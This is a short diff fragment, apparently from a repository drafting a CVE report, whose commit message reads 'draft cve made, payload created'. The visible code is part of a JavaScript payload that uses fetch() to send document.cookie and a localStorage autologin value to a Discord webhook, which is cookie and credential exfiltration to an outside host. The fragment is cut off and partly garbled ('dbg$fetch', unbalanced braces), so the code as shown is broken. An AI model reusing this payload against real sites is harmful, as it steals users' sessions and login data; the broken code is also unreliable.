@@ -25,4 +25,3 @@ dbg$fetch('https://discord.com/api/webhooks/{webhookID}/{webhookToken}{
     + document.cookie + 'Login' + localStorage.autologin})
 });
 ```
->>>>>>> 1cf9abc (inital commit: draft cve made, payload created)
